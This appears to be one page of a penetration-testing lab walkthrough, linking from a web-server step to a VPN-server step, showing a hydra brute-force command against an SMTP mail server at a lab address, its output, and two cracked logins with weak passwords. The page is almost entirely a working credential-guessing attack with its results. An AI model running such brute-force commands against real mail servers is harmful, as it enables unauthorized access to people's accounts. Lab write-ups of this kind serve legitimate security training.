<- From Web Server
# Brute force Mail Server
```bash
hydra -L ../WebServer/usernames-domain.txt -P ../passwords.txt $IP smtp -v

[25][smtp] host: 10.200.52.11   login: laura.wood@corp.thereserve.loc   password: Password1@
[VERBOSE] using SMTP LOGIN AUTH mechanism
[25][smtp] host: 10.200.52.11   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!
[STATUS] attack finished for 10.200.52.11 (waiting for children to complete tests)
1 of 1 target successfully completed, 2 valid passwords found
```

```txt
laura.wood@corp.thereserve.loc Password1@
mohammad.ahmed@corp.thereserve.loc Password1!
```

-> To VPN Server